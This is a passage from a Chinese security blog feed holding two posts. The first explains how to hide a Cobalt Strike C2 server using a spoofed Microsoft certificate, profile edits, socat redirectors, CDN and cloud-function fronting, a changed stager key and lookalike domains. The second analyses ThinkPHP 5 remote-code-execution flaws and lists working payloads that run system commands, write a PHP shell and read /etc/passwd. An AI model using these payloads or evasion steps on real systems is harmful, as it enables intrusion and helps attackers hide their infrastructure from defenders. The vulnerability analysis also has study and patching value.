&quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;!-alias microsoft.com -dname &quot;CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US&quot;!g&#x27;</span> teamserver</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_c.png"></p><h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>改了远控服务端证书后，抓包可以发现通过HTTPS的Beacon上线机器用的证书并不是同一个，而且同样存在可被识别的固定特征。</p><p><img src="/img/jcyyccss_w.png"></p><p><img src="/img/jcyyccss_x.png"></p><p>可以向<code>Let&#39;s Encrypt</code>申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请免费证书</span></span><br><span class="line">apt install certbot</span><br><span class="line">certbot certonly --standalone -d update.domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将证书打包并生成store文件</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> /etc/letsencrypt/live/update.domain.com/fullchain.pem -inkey /etc/letsencrypt/live/update.domain.com/privkey.pem -out update.domain.com.p12 -name update.domain.com -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore update.domain.com.store -srckeystore update.domain.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="built_in">alias</span> update.domain.com</span><br></pre></td></tr></table></figure><p>接下来就需要用到<a href="https://www.cobaltstrike.com/help-malleable-c2">Malleable C2 profile</a>来引入我们自己申请的证书。以<code>amazon.profile</code>为例，将刚才生成的store文件放到CS目录下，向<code>amazon.profile</code>文件追加证书配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">https-certificate &#123;</span></span><br><span class="line"><span class="string">    set keystore &quot;update.domain.com.store&quot;;</span></span><br><span class="line"><span class="string">    set password &quot;123456&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺带把dns_idle和stager路径也改了</span></span><br><span class="line">sed -i <span class="string">&#x27;11i\set dns_idle &quot;8.8.8.8&quot;;&#x27;</span> amazon.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">http-stager &#123;</span></span><br><span class="line"><span class="string">    set uri_x86 &quot;/jquery.min.js&quot;;</span></span><br><span class="line"><span class="string">    set uri_x64 &quot;/jquery.debug.js&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置文件有效性</span></span><br><span class="line">./c2lint amazon.profile</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_y.png"></p><p>再通过<code>nohup ./teamserver IP password amazon.profile &amp;</code>启动后抓上线包，证书就是自己申请的了</p><hr><p>经过以上修改后虽然起到了一定的伪装效果，但在投递Payload、Beacon监听、会话回连等过程中，马被杀被分析、Beacon的Listener被主动扫描、流量触发WAF/IDS规则都可能让C2服务器等基础设施难逃被标记的命运，这时我们可以拉一个靠山（云）或是临时工（VPS）顶在前面，使得CS服务器从风暴前线转移到相对安全的后方阵地。</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>就像nginx反向代理会隐藏后端的tomcat等应用服务器一样，我们可以开一个按时付费、随时能销毁的机器充当临时工，它作为一个中间人转发马和CS服务器相应端口的流量。但要注意的是需要给CS服务器所在机器加上白名单防火墙，只放行临时工机器的IP。</p><ul><li>当然也有个缺点就是CS操作界面的外部IP就都会是临时工的IP了，可以设置<code>trust_x_forwarded_for</code>头或通过目标向Log平台发起请求等方法获取真实IP</li></ul><p><img src="/img/jcyyccss_d.png"></p><p>图是CS手册里的，暂时不必搞这么多分工和分级，先搭建一个简单的<code>目标机器 &lt;-&gt; 临时工 &lt;-&gt; CS服务器</code>这种拓扑的环境。</p><p>I. 设置CS服务器所在机器的白名单防火墙</p><p><img src="/img/jcyyccss_e.png"></p><p>II. 在临时工机器上安装socat并进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install socat</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 &amp;</span><br><span class="line">socat TCP4-LISTEN:443,fork TCP4:1.1.1.1:443 &amp;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用 netstat -pantu | grep socat 查看后台转发的端口，kill PID 中止转发</span></span><br></pre></td></tr></table></figure><p>III. 创建CS的Listener，设置回连地址为临时工的IP</p><p><img src="/img/jcyyccss_f.png"></p><p>IV. 向目标投递马子并执行，然后坐等上线即可</p><ul><li>此外还有一些专门做转发比如微林之类的</li></ul><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>简单的CDN转发其实就是临时工角色从自己开的VPS变成了Cloudflare、XX云等厂商而已，只需要将域名ns记录给到对应的CDN厂商，之后马儿通过域名上线即可。注意一下CS服务器所在机器的防火墙白名单，要设置为CDN厂商的段（没有预设的话就自己搜集一下）。</p><p><img src="/img/jcyyccss_g.png"></p><p>这个的好处就是，相比自己开的临时工VPS依然可能被标记/被封，CDN厂商IP服务的站会很多，威胁情报要规避误报不太可能把CDN都拉黑。。。下面简述一下在freenom注册域名并且走Cloudflare CDN上线的流程。</p><p>I. 在freenom嫖一个免费域名，不用付费也规避了资金溯源</p><p>II. 将域名的NS记录设置为CF提供的</p><p><img src="/img/jcyyccss_h.png"></p><p>III. 等DNS缓存刷新后，通过域名上线即可</p><p><img src="/img/jcyyccss_i.png"></p><ul><li>要注意在<code>DNS-&gt;配置</code>中开启<code>开发模式</code>用来取消缓存（每次3小时），否则可能会只有心跳但执行不了命令。其次CloudFlare免费套餐限定了<a href="https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy">http/https能用的端口</a></li></ul><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>在介绍域前置是什么之前，我们先思考一个问题：CDN一个IP对应多个站点，它是怎么知道到底每个请求要回源到哪个站点的。答案就是根据HTTP的Host请求头来区分，举个例子：</p><ul><li>a.com 用了CDN 1.2.3.4</li><li>b.net 也用了CDN 1.2.3.4</li></ul><p>我们通过<code>curl -v &#39;a.com&#39; -H &#39;b.net&#39;</code>最终访问的也是<code>b.net</code>，因为<code>a.com</code>的DNS会解析到<code>1.2.3.4</code>，而CDN是根据Host来判断的。</p><p>因此就可以在CDN中配置回源IP为CS所在服务器，并将加速域名设置为 <code>在该CDN提供商这里尚未被占用的</code> 高可信白名单子域名（例如systemupdate.microsoft.com）</p><p>但是，真的是这样嘛？</p><p>放在以前，甚至半年前都是可行的。很多CDN提供商都不需要校验加速域名的所有权，或是如果回源IP为自家产品就不需要校验。但是现在以前常说的<code>CloudFront、Azure、CloudFlare、阿里云</code>等厂商都需要<a href="https://help.aliyun.com/document_detail/169377.html?spm=5176.11785003.overview.3.704c142fjv5nwd">验证域名归属权</a>了，需要向加速域名添加CNAME、TXT等记录来证明所有权，这样基本也就断了这条路子。</p><p>还有点小想法就是利用某些有子域控制权的服务、拿下一些软柿子DNS控制权、或者退而求其次注册些形如<code>mlcrosoft</code>的域名骗骗视力不好的管理员。</p><ul><li>也许还有不需要验证或是能Bypass的，只是笔者还没发现或是get到姿势</li></ul><h3 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h3><p>云函数简单的说就是云服务厂商已经搭建好了多种语言执行环境，我们只需要把代码通过Web传上去（或是在线编辑）就能执行。部署在云上自带CDN特效，只需要跑个转发代码就能被当作转发器用，即<code>目标机器 &lt;-&gt; 云函数CDN &lt;-&gt; CS服务器</code>。</p><p><img src="/img/jcyyccss_j.png"></p><p>各个厂商的云函数部署大同小异，具体方法可参考各家的文档。笔者特意测试了CS4.0是能正常上线并执行命令的，并不是一定得用CS4.1。除此之外中间其实踩了不少坑，挑几个可能比较普适的聊一下QAQ。</p><p><img src="/img/jcyyccss_k.png"></p><p>I. 首先编写转发代码时，URL后不要再加斜杠<code>/</code>了，不然到了CS那可能会成双斜杠<code>//</code>，转发的协议也要跟CS的Listener类型要对得上。比如位于<code>1.1.1.1</code>机器上的CS有一个https的Listener，那转发代码的URL就要写成<code>https://1.1.1.1</code></p><p>II. 为了用自己搞的HTTPS证书就会要套profile，如果在<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>的基础上改，一定要修改或是注释掉里面<code>header &quot;Host&quot;</code>部分。至于原因，想想之前介绍的CDN如何区分不同站点就明白了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/header &quot;Host&quot;/#header &quot;Host&quot;/g&#x27;</span> amazon.profile</span><br></pre></td></tr></table></figure><p>III. 云函数会有 前端/后端 请求超时时间，建议把这个秒数稍微调大点，不然stage的马可能来不及走完流程就被挂了。</p><p>IV. 需要启用集成响应，否则上线下发不了命令。</p><h2 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h2><p>CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;x9cI&#x2F;</span><br><span class="line">&#x2F;fYKR&#x2F;</span><br><span class="line">&#x2F;Mrm0&#x2F;</span><br><span class="line">&#x2F;wQPD&#x2F;</span><br><span class="line">&#x2F;yDHX&#x2F;</span><br><span class="line">&#x2F;BCre&#x2F;</span><br><span class="line">&#x2F;WHVh&#x2F;</span><br></pre></td></tr></table></figure><p>在profile中配置<code>http-stager</code>可以改变stage马的默认请求路径：</p><p><img src="/img/jcyyccss_l.png"></p><p>但这并不会让之前的默认规则失效，此时通过checksum8规则路径依然是可以正常上线执行命令的。</p><p><img src="/img/jcyyccss_m.png"></p><p>我们在浏览器中手动访问该路径会下载一个文件，随后可以利用固定的抑或密钥将其解密看个光光。</p><p><img src="/img/jcyyccss_n.png"></p><p>解决这个问题最方便的办法就是用完就把stager给kill掉，用的时候再编辑下Listener并保存就会重新开起来。</p><p><img src="/img/jcyyccss_o.png"></p><p>比较一劳永逸的办法就是反编译出class修改抑或字节并重新加密替换回去。已经有师傅改好了现成的，不过<code>0x3e</code>这个抑或字节迟早也会被加入解密全家桶，所以还是得团队自己改好一个自用的并将知道密钥的人咩口（误。之后再用<code>grab_beacon_config.nse</code>脚本去扫描，因为抑或密钥变了自然也就解析不出了。</p><p><img src="/img/jcyyccss_p.png"></p><h2 id="JA3-S-amp-JARM"><a href="#JA3-S-amp-JARM" class="headerlink" title="JA3/S &amp; JARM"></a>JA3/S &amp; JARM</h2><p>这是一类根据Java版本、Web服务器、TLS版本等多因素TLS握手包生成指纹的方法，具体介绍及工具可参考<a href="https://github.com/salesforce/jarm">jarm</a>。</p><p>目前主要用于识别的CS的JARM指纹是<code>07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1</code>，利用这个指纹去识别其实也会包含不少像Tomcat、Weblogic这类的JavaWeb服务器。且该指纹是基于JDK11，如果用JDK13去跑CS则会得到不一样的指纹。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据对CS服务器的识别方式，主要可以分为主动扫描和被动识别，同时对每种标记方法介绍了相应的隐藏方法。像端口转发、CDN这类方法其实也可以组合使用，不过从实测的速度来看效果会很不理想。除此以外还有一些小套路比如让上线用的域名泛解析到同行（逃，像CloudFlare这种免费套餐不允许设置泛解析的就多加几条记录。</p><p>对于防守方来说，除了利用上述方法去识别没捂严实的CS服务器，可以考虑利用checksum8规则的特点给CS服务器疯狂假上线干扰攻击队，或者直接给各大杀软和沙箱批量交样本:(</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1349/">Cobalt Strike 绕过流量审计</a></p><p><a href="http://www.feidao.site/wordpress/?p=4457">CobaltStrike流量规避和cdn配置</a></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/108027233">使用CobaltStrike搭建域前置</a></p><p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p><p><a href="https://lmntrix.com/lab/lmntrix-labs-hiding-in-plain-sight-with-reflective-injection-and-domain-fronting/">Reflective Injection And Domain Fronting</a></p><p><a href="https://www.anquanke.com/post/id/224535">浅析CobaltStrike Beacon Staging Server扫描</a></p><p><a href="https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw">Bypass cobaltstrike beacon config scan</a></p><p><a href="https://sysopfb.github.io/malware,/cobaltstrike/2020/03/24/beacon-in-azure.html">Hiding in the clouds</a></p><p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">CobaltStrikeParser</a></p><p><a href="https://mp.weixin.qq.com/s/hz9lZidZXgbPrkI32pCdVQ">关于CobaltStrike的Stager被扫问题</a></p><p><a href="https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/">Analyzing Cobalt Strike for Fun and Profit</a></p><p><a href="https://blog.cobaltstrike.com/2020/12/08/a-red-teamer-plays-with-jarm/">A Red Teamer Plays with JARM</a></p><p><a href="https://www.anquanke.com/post/id/225627">利用JARM指纹进行TLS服务端标记</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。&lt;/p&gt;
&lt;h2 id=&quot;默认端口&quot;&gt;&lt;a href=&quot;#默认端口&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="cs" scheme="https://hosch3n.github.io/tags/cs/"/>
    
    <category term="检测" scheme="https://hosch3n.github.io/tags/%E6%A3%80%E6%B5%8B/"/>
    
    <category term="伪装" scheme="https://hosch3n.github.io/tags/%E4%BC%AA%E8%A3%85/"/>
    
    <category term="端口" scheme="https://hosch3n.github.io/tags/%E7%AB%AF%E5%8F%A3/"/>
    
    <category term="tls" scheme="https://hosch3n.github.io/tags/tls/"/>
    
    <category term="cdn" scheme="https://hosch3n.github.io/tags/cdn/"/>
    
    <category term="stage" scheme="https://hosch3n.github.io/tags/stage/"/>
    
    <category term="ja3" scheme="https://hosch3n.github.io/tags/ja3/"/>
    
    <category term="jarm" scheme="https://hosch3n.github.io/tags/jarm/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析代码执行篇</title>
    <link href="https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/</id>
    <published>2020-11-05T11:51:12.000Z</published>
    <updated>2020-12-03T05:45:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境搭建基础可以参考SQL注入篇和官方文档</p><h2 id="代码执行1"><a href="#代码执行1" class="headerlink" title="代码执行1"></a>代码执行1</h2><p>通过传参可以调用任意类方法，调用一些具有回调功能的函数时可以导致代码执行。</p><p>影响版本：</p><ul><li>5.0.7&lt;=ThinkPHP&lt;=5.0.22</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.1</span><br><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.0</span><br><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username             # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;runtime&#x2F;log&#x2F;202012&#x2F;02.log  # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php     # 包含任意.php文件</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.23</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">改进控制器获取</a>这个commit</p><p><img src="/img/tp5ldfxrce_a.png"></p><p>加了个限制大小写字母的过滤。从官方文档可以知道，获取控制器的方式取决于用的哪种路由模式，ThinkPHP默认无强制路由、支持兼容模式，SQL注入篇中都是用的<code>?s=/模块/控制器/方法</code>这种Payload，此处可以合理猜测能够调用到危险方法。</p><p>将源码更新为5.0.22，直接全局搜索<code>eval</code>、<code>assert</code>和<code>system</code>这类赤果果的关键词基本没得搞头，但是搜回调类、反射类的函数就会眼前一亮。</p><p><img src="/img/tp5ldfxrce_b.png"></p><p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p><p><img src="/img/tp5ldfxrce_d.png"></p><p>5.1版本的利用方法类似而且能利用的类比5.0更多，官方正则判断的修复方式就是卡了命名空间的逃逸。</p><ul><li><code>$_SERVER[&#39;PATH_INFO&#39;]</code>会将<code>\</code>转为<code>/</code></li></ul><h2 id="代码执行2"><a href="#代码执行2" class="headerlink" title="代码执行2"></a>代码执行2</h2><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">sss&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;route[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"># 包含任意文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[REQUEST_METHOD]&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 5.1.17 &lt;&#x3D; ThinkPHP5 &lt;&#x3D; 5.1.32 需要error_reporting(0);</span><br><span class="line">c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.24</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a>这个commit</p><p><img src="/img/tp5ldfxrce_e.png"></p><p>调用<code>Request</code>类方法前做了白名单判断，猜测漏洞可能是能调用当前类任意方法，找到<code>Config::get(&#39;var_method&#39;)</code>对应的值为<code>_method</code>。</p><p><img src="/img/tp5ldfxrce_f.png"></p><p>回顾一下SQL注入篇中说过<code>凡是使用框架提供的请求变量获取方法(Request类param方法及input助手函数)，都会经过这个filterExp方法的过滤</code>，其中的<code>filterExp</code>方法是被<code>filterValue</code>方法拉起调用的，而<code>filterValue</code>方法中就存在敏感函数<code>call_user_func</code>：</p><p><img src="/img/tp5ldfxrce_g.png"></p><p>全局搜索对应的<code>filterValue</code>方法，看到可以由824行的<code>cookie</code>方法或是由994行的<code>input</code>方法触发（但是似乎框架默认逻辑没有用到<code>cookie</code>方法）。</p><p><img src="/img/tp5ldfxrce_h.png"></p><p>跟进<code>getFilter</code>方法后看上去影响不大先不管，回来继续向上跟进<code>array_walk_recursive</code>函数传递的第一和第三个参数，进而寻找调用了<code>input</code>方法的地方（<code>-&gt;input\(|::input\(</code>）：</p><p><img src="/img/tp5ldfxrce_i.png"></p><p>这个构造函数简直来得不要太妙（是个伏笔2333）：如果当前类中的属性名有与<code>$options</code>数组中键名相同的，就会被覆盖为相应的键值，并且给<code>$this-&gt;input</code>属性赋值了完全可控的<code>php://input</code>。</p><p>有很多地方调用了<code>input</code>方法，先看下<code>Request</code>类的<code>param</code>方法：</p><p><img src="/img/tp5ldfxrce_j.png"></p><p>出现了被更新白名单的<code>method</code>方法，至此利用链的链尾已经基本清晰：</p><p>?-&gt;<code>param</code>-&gt;<code>method</code>、<code>input</code>-&gt;<code>filterValue</code>-&gt;<code>call_user_func</code></p><p>接下来需要思考如何通过<code>Request</code>类的某个方法修改默认为空的<code>$filter</code>的值呢？刚才那个构造函数刚好可以实现对<code>$this-&gt;filter</code>变量覆盖！也就是通过$_POST传入<code>_method=__construct&amp;filter[]=system</code>。搞定了一个参数，继续想办法搞定另外一个参数：</p><p><img src="/img/tp5ldfxrce_k.png"></p><p>继续通过变量覆盖控制<code>$this-&gt;get</code>或者<code>$this-&gt;route</code>的值，就能直接进到<code>input</code>方法中。也就是继续通过$_POST传入<code>&amp;get[]=whoami</code>或是<code>&amp;route[]=whoami</code>，此时如果<code>&#39;app_debug&#39; =&gt; true,</code>就可以直接看到命令执行结果：</p><p><img src="/img/tp5ldfxrce_l.png"></p><p>这也印证了此时的<code>param</code>方法确实被框架调用了，但是一旦关掉<code>app_debug</code>就会发现并不能RCE了 T^T，显然事情没这么简单，我们还是得继续老实向前分析调用栈。动态调试一下看看调用栈里是谁翻了<code>param</code>方法的牌子：</p><p><img src="/img/tp5ldfxrce_m.png"></p><p><code>self::$debug</code>就是框架从配置文件中加载的值，所以关掉<code>app_debug</code>就不会调用到<code>param</code>方法了（淦）。那还有没有办法调用到呢？全局搜索可以看到当<code>App</code>类的<code>exec</code>方法中<code>$dispatch[&#39;type&#39;]</code>为<code>controller</code>或是<code>method</code>时就可以。</p><p><img src="/img/tp5ldfxrce_n.png"></p><p>于是继续跟进方法调用和变量传递：</p><p><img src="/img/tp5ldfxrce_o.png"></p><p><img src="/img/tp5ldfxrce_p.png"></p><p><img src="/img/tp5ldfxrce_q.png"></p><p><code>check</code>方法里面有点复杂。。。马后炮一下直接先看<code>parseRule</code>方法：</p><p><img src="/img/tp5ldfxrce_r.png"></p><p>需要<code>$route</code>为<code>\</code>或者<code>@</code>，继续回去跟进变量传递：</p><p><img src="/img/tp5ldfxrce_s.png"></p><p>TP5完整版或是通过<code>composer require topthink/think-captcha 1.*</code>安装的验证码扩展，会在<code>vendor/topthink/think-captcha/src/helper.php</code>中注册一条<code>get</code>路由。由于此处<code>$method</code>是通过<code>$request-&gt;method()</code>获取到的，所以能够通过$_POST传入<code>&amp;method=get</code>间接对其进行变量覆盖。</p><p><img src="/img/tp5ldfxrce_t.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/222672">ThinkPHP5.0.x RCE分析与利用</a></p><p><a href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">THINKPHP 5.X RCE 漏洞分析与利用总结</a></p><p><a href="https://www.anquanke.com/post/id/177173">天融信关于ThinkPHP5.1框架结合RCE漏洞的深入分析</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p><p><a href="https://paper.seebug.org/1377/">ThinkPHP 组件漏洞与攻击链分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境搭建基础可以参考SQL注入篇和官方文档&lt;/p&gt;
&lt;h2 id=&quot;代码执行1&quot;&gt;&lt;a href=&quot;#代码执行1&quot; class=&quot;headerlink&quot; title=&quot;代码执行1&quot;&gt;&lt;/a&gt;代码执行1&lt;/h2&gt;&lt;p&gt;通过传参可以调用任意类方法，调用一些具有回调功能的函数时可</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="rce" scheme="https://hosch3n.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析SQL注入篇</title>
    <link href="https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</id>
    <published>2020-10-21T13:12:12.000Z</published>
    <updated>2020-12-02T08:51:27.000Z</updated>
    
